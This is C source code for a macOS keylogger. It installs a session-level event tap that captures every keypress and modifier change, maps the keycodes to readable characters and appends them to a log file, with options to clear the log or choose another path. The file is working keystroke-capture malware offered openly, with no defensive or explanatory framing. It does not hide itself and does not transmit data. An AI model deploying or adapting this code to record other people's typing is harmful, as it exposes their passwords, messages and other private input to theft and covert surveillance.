#include "keylogger.h"

int keyCodeCache[127];
int capsLock = 57;
int leftShift = 56;
int rightShift = 60;

int main(int argc, const char *argv[]) {

    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if (!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);


    // Clear the logfile if clear argument used or log to specific file if given.
    if (argc == 2) {
        if (strcmp(argv[1], "clear") == 0) {
            fopen(logfileLocation, "w");
            printf("%s cleared.\n", logfileLocation);
            fflush(stdout);
            exit(1);
        } else {
            logfileLocation = argv[1];
        }
    }

    // Get the current time and open the logfile.
    time_t result = time(NULL);
    logfile = fopen(logfileLocation, "a");

    if (!logfile) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        exit(1);
    }

    // Output to logfile.
    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
    fflush(logfile);

    // Display the location of the logfile and start the loop.
    printf("Logging to: %s\n", logfileLocation);
    fflush(stdout);
    CFRunLoopRun();

    return 0;
}

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
        return event;
    }

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    if (keyCode == leftShift || keyCode == rightShift || keyCode == capsLock) {
        keyCodeCache[keyCode] = keyCodeCache[keyCode] == 1 ? 0 : 1;
        return event;
    }

    // Print the human readable key to the logfile.
    bool shift = keyCodeCache[rightShift] + keyCodeCache[leftShift] > 0;
    bool caps = keyCodeCache[capsLock] == 1;
    fprintf(logfile, "%s\n", convertKeyCode(keyCode, shift, caps));
    fflush(logfile);
    return event;
}

// The following method converts the key code returned by each keypress as
// a human readable key code in const char format.
const char *convertKeyCode(int keyCode, bool shift, bool caps) {
    switch ((int) keyCode) {
        case 0:   return shift || caps ? "[shift]\na" : "a";
        case 1:   return shift || caps ? "[shift]\ns" : "s";
        case 2:   return shift || caps ? "[shift]\nd" : "d";
        case 3:   return shift || caps ? "[shift]\nf" : "f";
        case 4:   return shift || caps ? "[shift]\nh" : "h";
        case 5:   return shift || caps ? "[shift]\ng" : "g";
        case 6:   return shift || caps ? "[shift]\nz" : "z";
        case 7:   return shift || caps ? "[shift]\nx" : "x";
        case 8:   return shift || caps ? "[shift]\nc" : "c";
        case 9:   return shift || caps ? "[shift]\nv" : "v";
        case 11:  return shift || caps ? "[shift]\nb" : "b";
        case 12:  return shift || caps ? "[shift]\nq" : "q";
        case 13:  return shift || caps ? "[shift]\nw" : "w";
        case 14:  return shift || caps ? "[shift]\ne" : "e";
        case 15:  return shift || caps ? "[shift]\nr" : "r";
        case 16:  return shift || caps ? "[shift]\ny" : "y";
        case 17:  return shift || caps ? "[shift]\nt" : "t";
        case 18:  return shift ? "[shift]\n1" : "1";
        case 19:  return shift ? "[shift]\n2" : "2";
        case 20:  return shift ? "[shift]\n3" : "3";
        case 21:  return shift ? "[shift]\n4" : "4";
        case 22:  return shift ? "[shift]\n6" : "6";
        case 23:  return shift ? "[shift]\n5" : "5";
        case 24:  return shift ? "[shift]\n=" : "=";
        case 25:  return shift ? "[shift]\n9" : "9";
        case 26:  return shift ? "[shift]\n7" : "7";
        case 27:  return shift ? "[shift]\n-" : "-";
        case 28:  return shift ? "[shift]\n8" : "8";
        case 29:  return shift ? "[shift]\n0" : "0";
        case 30:  return shift ? "[shift]\n]" : "]";
        case 31:  return shift || caps ? "[shift]\no" : "o";
        case 32:  return shift || caps ? "[shift]\nu" : "u";
        case 33:  return shift ? "[shift]\n[" : "[";
        case 34:  return shift || caps ? "[shift]\ni" : "i";
        case 35:  return shift || caps ? "[shift]\np" : "p";
        case 37:  return shift || caps ? "[shift]\nl" : "l";
        case 38:  return shift || caps ? "[shift]\nj" : "j";
        case 39:  return shift ? "[shift]\n'" : "'";
        case 40:  return shift || caps ? "[shift]\nk" : "k";
        case 41:  return shift ? "[shift]\n;" : ";";
        case 42:  return shift ? "[shift]\n\\" : "\\";
        case 43:  return shift ? "[shift]\n," : ",";
        case 44:  return shift ? "[shift]\n/" : "/";
        case 45:  return shift || caps ? "[shift]\nn" : "n";
        case 46:  return shift || caps ? "[shift]\nm" : "m";
        case 47:  return shift ? "[shift]\n." : ".";
        case 50:  return shift ? "[shift]\n`" : "`";
        case 65:  return "[decimal]";
        case 67:  return "[asterisk]";
        case 69:  return "[plus]";
        case 71:  return "[clear]";
        case 75:  return "[divide]";
        case 76:  return "[enter]";
        case 78:  return "[hyphen]";
        case 81:  return "[equals]";
        case 82:  return "0";
        case 83:  return "1";
        case 84:  return "2";
        case 85:  return "3";
        case 86:  return "4";
        case 87:  return "5";
        case 88:  return "6";
        case 89:  return "7";
        case 91:  return "8";
        case 92:  return "9";
        case 36:  return "[return]";
        case 48:  return "[tab]";
        case 49:  return " ";
        case 51:  return "[del]";
        case 53:  return "[esc]";
        case 54:  return "[right-cmd]";
        case 55:  return "[left-cmd]";
        case 56:  return "[left-shift]";
        case 57:  return "[caps]";
        case 58:  return "[left-option]";
        case 59:  return "[left-ctrl]";
        case 60:  return "[right-shift]";
        case 61:  return "[right-option]";
        case 62:  return "[right-ctrl]";
        case 63:  return "[fn]";
        case 64:  return "[f17]";
        case 72:  return "[volup]";
        case 73:  return "[voldown]";
        case 74:  return "[mute]";
        case 79:  return "[f18]";
        case 80:  return "[f19]";
        case 90:  return "[f20]";
        case 96:  return "[f5]";
        case 97:  return "[f6]";
        case 98:  return "[f7]";
        case 99:  return "[f3]";
        case 100: return "[f8]";
        case 101: return "[f9]";
        case 103: return "[f11]";
        case 105: return "[f13]";
        case 106: return "[f16]";
        case 107: return "[f14]";
        case 109: return "[f10]";
        case 111: return "[f12]";
        case 113: return "[f15]";
        case 114: return "[help]";
        case 115: return "[home]";
        case 116: return "[pgup]";
        case 117: return "[fwddel]";
        case 118: return "[f4]";
        case 119: return "[end]";
        case 120: return "[f2]";
        case 121: return "[pgdown]";
        case 122: return "[f1]";
        case 123: return "[left]";
        case 124: return "[right]";
        case 125: return "[down]";
        case 126: return "[up]";
    }
    return "[unknown]";
}
